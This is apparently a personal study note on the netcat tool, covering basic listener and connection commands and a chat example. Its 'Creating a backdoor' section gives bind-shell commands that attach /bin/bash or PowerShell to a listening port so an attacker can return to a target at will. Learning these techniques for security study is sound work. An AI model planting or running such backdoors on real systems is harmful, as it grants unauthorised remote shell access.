#os/linux/tools/hacking

# NETCAT

| Command              | Description                                             |
| -------------------- | ------------------------------------------------------- |
| ip route get 8.8.8.8 | Get The IP Address                                      |
| nc -h                | Get Netcat Help                                         |
| nc -lvvp 4444        | Create Listener                                         |
| nc 192.168.1.35 4444 | Make Connection to the IP address on the specified Port |

1. 1.**
    
    # 1. Chatting
    
    **

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Netcat can also be used to chat between two users. We need to establish a connection before chatting. To do this we are going to need two devices. One will play the role of initiator and one will be a listener to start the conversation and so once the connection is established, communication can be done from both ends. First of all, we will use Windows 10 machine which will play role of Listener.Second we will use Kali linux machine which will play role of initiator. First, we will have to create a listener. We will use the following command to create a listener: 

## nc -lvvp 4444

# where,   
# [-l]: Listen Mode   
# [vv]: Verbose Mode {It can be used once, but we use twice to be more verbose}   
# [p]: Local Port 

Now, it’s time to create an initiator, for this we will just provide the IP Address of the System where we started the Listener followed by the port number. 

**NOTE:** Use the same port to create an initiator that was used in creating listener. 

## nc 192.168.1.35 4444 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. 2.**
    
    # 2. Creating a backdoor
    
    **
    

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

### We can also create a backdoor using NC.

### To create a backdoor on the target system that we can come back to at any time.

## Command for attacking a Linux System. 

## nc -l -p 3556 -e /bin/bash 

## For Creating Backdoor for Windows system. 

## nc -l -p 3556 -e powershell

### This will open a listener on the system that will pipe the command shell or the Linux bash shell to the connecting system. 

## Make a Connection to the Remote Shell

## nc 192.168.1.35 3556 

sources

1. [https://www.geeksforgeeks.org/introduction-to-netcat/?ref=ml_lbp](https://www.geeksforgeeks.org/introduction-to-netcat/?ref=ml_lbp)
2. [https://www.maketecheasier.com/netcat-transfer-files-between-linux-computers/](https://www.maketecheasier.com/netcat-transfer-files-between-linux-computers/)
3. [https://superuser.com/questions/98089/sending-file-via-netcat](https://superuser.com/questions/98089/sending-file-via-netcat)